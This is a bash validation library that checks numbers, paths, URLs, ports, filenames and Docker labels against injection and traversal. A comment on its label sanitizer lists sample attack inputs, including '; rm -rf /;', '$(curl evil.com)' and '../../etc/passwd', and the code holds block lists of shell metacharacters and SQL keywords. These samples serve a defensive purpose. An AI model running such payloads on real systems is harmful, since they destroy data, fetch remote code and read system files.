#!/usr/bin/env bash
# scripts/lib/validation.sh - Shell input validation and sanitization framework
#
# Purpose: Provide comprehensive validation and sanitization functions for shell scripts
# Usage: source scripts/lib/validation.sh
#
# Functions:
#   validate_numeric        - Validate and sanitize numeric inputs
#   validate_path           - Prevent path traversal attacks
#   validate_command        - Prevent command injection
#   safe_divide             - Division with zero-check and error handling
#   safe_arithmetic         - Safe arithmetic operations with overflow detection
#   verify_checksum         - SHA256 checksum verification
#   sanitize_filename       - Remove dangerous characters from filenames
#   validate_url            - Basic URL validation
#   validate_port           - Port number validation (1-65535)

set -euo pipefail

# GNU-tool shims for macOS (timeout/stat/date/sed/free/nproc/readlink).
# Defines nothing on Linux; see .claude/helpers/cfn-portable.sh.
. "$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd -P)/.claude/helpers/cfn-portable.sh" 2>/dev/null || true

# Color output for validation messages
readonly VAL_RED='\033[0;31m'
readonly VAL_GREEN='\033[0;32m'
readonly VAL_YELLOW='\033[1;33m'
readonly VAL_NC='\033[0m' # No Color

# Logging functions
val_error() {
  echo -e "${VAL_RED}[VALIDATION ERROR]${VAL_NC} $*" >&2
}

val_warn() {
  echo -e "${VAL_YELLOW}[VALIDATION WARN]${VAL_NC} $*" >&2
}

val_info() {
  echo -e "${VAL_GREEN}[VALIDATION OK]${VAL_NC} $*"
}

# Validate numeric input with optional range checking
# Usage: validate_numeric <value> [min] [max]
# Returns: 0 if valid, 1 if invalid
# Example: validate_numeric "$USER_INPUT" 0 100
validate_numeric() {
  local value=$1
  local min=${2:-}
  local max=${3:-}

  # Check if value is empty
  if [[ -z "$value" ]]; then
    val_error "Empty value provided (expected numeric)"
    return 1
  fi

  # Check if value is numeric (integer or float)
  if ! [[ "$value" =~ ^-?[0-9]+\.?[0-9]*$ ]]; then
    val_error "Invalid numeric value: '$value'"
    return 1
  fi

  # Range checking (if provided)
  if [[ -n "$min" ]] && (( $(echo "$value < $min" | bc -l) )); then
    val_error "Value $value below minimum $min"
    return 1
  fi

  if [[ -n "$max" ]] && (( $(echo "$value > $max" | bc -l) )); then
    val_error "Value $value exceeds maximum $max"
    return 1
  fi

  return 0
}

# Validate path and prevent path traversal
# Usage: validate_path <path> [allowed_base_dir]
# Returns: 0 if valid, 1 if invalid
# Example: validate_path "$USER_PATH" "/workspace"
validate_path() {
  local path=$1
  local base_dir=${2:-}

  # Check for path traversal patterns
  if [[ "$path" =~ \.\. ]]; then
    val_error "Path traversal detected: '$path'"
    return 1
  fi

  # Check for absolute path escapes (if base_dir provided)
  if [[ -n "$base_dir" ]]; then
    local resolved_path
    resolved_path=$(readlink -f "$path" 2>/dev/null || echo "$path")
    local resolved_base
    resolved_base=$(readlink -f "$base_dir" 2>/dev/null || echo "$base_dir")

    if [[ ! "$resolved_path" =~ ^"$resolved_base" ]]; then
      val_error "Path '$path' outside allowed directory '$base_dir'"
      return 1
    fi
  fi

  return 0
}

# Prevent command injection by validating command strings
# Usage: validate_command <command>
# Returns: 0 if valid, 1 if contains dangerous patterns
# Example: validate_command "$USER_COMMAND"
validate_command() {
  local command=$1

  # Dangerous patterns (shell metacharacters)
  local dangerous_patterns=(
    ";"      # Command separator
    "|"      # Pipe
    "&"      # Background execution
    "\$("    # Command substitution
    "\`"     # Command substitution (backticks)
    ">"      # Redirect
    "<"      # Redirect
    "\*"     # Wildcard
  )

  for pattern in "${dangerous_patterns[@]}"; do
    if [[ "$command" == *"$pattern"* ]]; then
      val_error "Dangerous pattern detected in command: $pattern"
      return 1
    fi
  done

  return 0
}

# Safe division with zero-check and error handling
# Usage: safe_divide <numerator> <denominator> [scale]
# Returns: Result or exits with error
# Example: result=$(safe_divide 100 5 2)  # Returns 20.00
safe_divide() {
  local numerator=$1
  local denominator=$2
  local scale=${3:-6}  # Default 6 decimal places

  # Validate inputs are numeric
  if ! validate_numeric "$numerator"; then
    val_error "Numerator is not numeric: '$numerator'"
    return 1
  fi

  if ! validate_numeric "$denominator"; then
    val_error "Denominator is not numeric: '$denominator'"
    return 1
  fi

  # Check for division by zero
  if (( $(echo "$denominator == 0" | bc -l) )); then
    val_error "Division by zero: $numerator / $denominator"
    return 1
  fi

  # Perform division
  local result
  result=$(echo "scale=$scale; $numerator / $denominator" | bc -l 2>/dev/null)

  if [[ -z "$result" ]]; then
    val_error "Division failed: $numerator / $denominator"
    return 1
  fi

  echo "$result"
  return 0
}

# Safe arithmetic operations with overflow detection
# Usage: safe_arithmetic <operation>
# Returns: Result or exits with error
# Example: result=$(safe_arithmetic "1000000000 * 1000000000")
safe_arithmetic() {
  local operation=$1

  # Validate operation doesn't contain command injection
  if ! validate_command "$operation"; then
    val_error "Dangerous operation rejected"
    return 1
  fi

  # Perform arithmetic with bc
  local result
  result=$(echo "scale=6; $operation" | bc -l 2>&1)
  local bc_exit=$?

  if [[ $bc_exit -ne 0 ]]; then
    val_error "Arithmetic operation failed: $operation"
    val_error "BC error: $result"
    return 1
  fi

  # Check for overflow (bc returns very large numbers)
  if [[ ${#result} -gt 100 ]]; then
    val_error "Potential overflow detected in result (>100 digits)"
    return 1
  fi

  echo "$result"
  return 0
}

# Verify SHA256 checksum of file
# Usage: verify_checksum <file> <expected_checksum>
# Returns: 0 if valid, 1 if invalid
# Example: verify_checksum composer.phar abc123...
verify_checksum() {
  local file=$1
  local expected=$2

  # Check file exists
  if [[ ! -f "$file" ]]; then
    val_error "File not found: $file"
    return 1
  fi

  # Calculate checksum
  local actual
  actual=$(sha256sum "$file" | awk '{print $1}')

  # Compare checksums (case-insensitive)
  if [[ "${actual,,}" != "${expected,,}" ]]; then
    val_error "Checksum mismatch for $file"
    val_error "  Expected: $expected"
    val_error "  Actual:   $actual"
    return 1
  fi

  val_info "Checksum verified for $file"
  return 0
}

# Sanitize filename by removing dangerous characters
# Usage: sanitize_filename <filename>
# Returns: Sanitized filename
# Example: safe_name=$(sanitize_filename "$USER_INPUT")
sanitize_filename() {
  local filename=$1

  # Remove path separators and dangerous characters
  # Keep: alphanumeric, dash, underscore, dot
  local sanitized
  sanitized=$(echo "$filename" | tr -cd '[:alnum:]._-')

  # Prevent hidden files (no leading dot)
  sanitized="${sanitized#.}"

  # Ensure not empty
  if [[ -z "$sanitized" ]]; then
    val_error "Filename sanitization resulted in empty string"
    return 1
  fi

  echo "$sanitized"
  return 0
}

# Validate URL format (basic validation)
# Usage: validate_url <url>
# Returns: 0 if valid, 1 if invalid
# Example: validate_url "$USER_URL"
validate_url() {
  local url=$1

  # Basic URL pattern matching (http/https)
  if [[ ! "$url" =~ ^https?://[a-zA-Z0-9\.\-]+(/.*)?$ ]]; then
    val_error "Invalid URL format: '$url'"
    return 1
  fi

  return 0
}

# Validate port number (1-65535)
# Usage: validate_port <port>
# Returns: 0 if valid, 1 if invalid
# Example: validate_port "$CFN_REDIS_PORT"
validate_port() {
  local port=$1

  # Validate numeric
  if ! validate_numeric "$port" 1 65535; then
    val_error "Invalid port number: '$port' (must be 1-65535)"
    return 1
  fi

  return 0
}

# Sanitize container label for Docker API
# Purpose: Prevent label injection attacks (CVSS 7.5)
# Usage: sanitize_label <label_value>
# Returns: Sanitized label or exits with error if invalid
# Example: SAFE_LABEL=$(sanitize_label "$USER_INPUT")
#
# Security Requirements:
# - Alphanumeric, hyphen, underscore only
# - Maximum 63 characters (Kubernetes label limit)
# - No leading/trailing hyphens
# - No shell metacharacters
# - No path traversal sequences
# - No command substitution
# - No SQL injection patterns
#
# Attack Vectors Blocked:
# - Shell injection: '; rm -rf /;'
# - SQL injection: ' OR 1=1--
# - Command substitution: $(curl evil.com)
# - Path traversal: ../../etc/passwd
sanitize_label() {
  local label=$1

  # Check for empty input
  if [[ -z "$label" ]]; then
    val_error "Label cannot be empty"
    return 1
  fi

  # Trim leading and trailing whitespace
  label="${label#"${label%%[![:space:]]*}"}"
  label="${label%"${label##*[![:space:]]}"}"

  # Check length (Kubernetes DNS label limit: 63 chars)
  if [[ ${#label} -gt 63 ]]; then
    val_error "Label exceeds maximum length: ${#label} chars (max: 63)"
    return 1
  fi

  # Validate format: alphanumeric, hyphen, underscore only
  # Pattern: starts with alphanumeric, contains alphanumeric/hyphen/underscore, ends with alphanumeric
  if [[ ! "$label" =~ ^[a-z0-9][a-z0-9_-]*[a-z0-9]$ ]] && [[ ! "$label" =~ ^[a-z0-9]$ ]]; then
    val_error "Label contains invalid characters: '$label'"
    val_error "  Allowed: lowercase letters, numbers, hyphen, underscore"
    val_error "  Pattern: must start and end with alphanumeric"
    return 1
  fi

  # Additional security checks for dangerous patterns

  # Block path traversal sequences
  if [[ "$label" =~ \.\.|/|\\  ]]; then
    val_error "Label contains path traversal sequences: '$label'"
    return 1
  fi

  # Block shell metacharacters
  if [[ "$label" =~ [\;\|\&\$\`\(\)\{\}\[\]\<\>\'\"] ]]; then
    val_error "Label contains shell metacharacters: '$label'"
    return 1
  fi

  # Block SQL injection patterns
  if [[ "$label" =~ (DROP|SELECT|INSERT|UPDATE|DELETE|UNION|WHERE|OR\ 1=1|--|\'|--) ]]; then
    val_error "Label contains SQL injection pattern: '$label'"
    return 1
  fi

  # Label is valid and sanitized
  echo "$label"
  return 0
}

# Export functions for use in other scripts
export -f validate_numeric
export -f validate_path
export -f validate_command
export -f safe_divide
export -f safe_arithmetic
export -f verify_checksum
export -f sanitize_filename
export -f validate_url
export -f validate_port
export -f sanitize_label
export -f val_error
export -f val_warn
export -f val_info

# Library loaded successfully
val_info "Shell validation framework loaded (v1.1.0 - label sanitization added)"
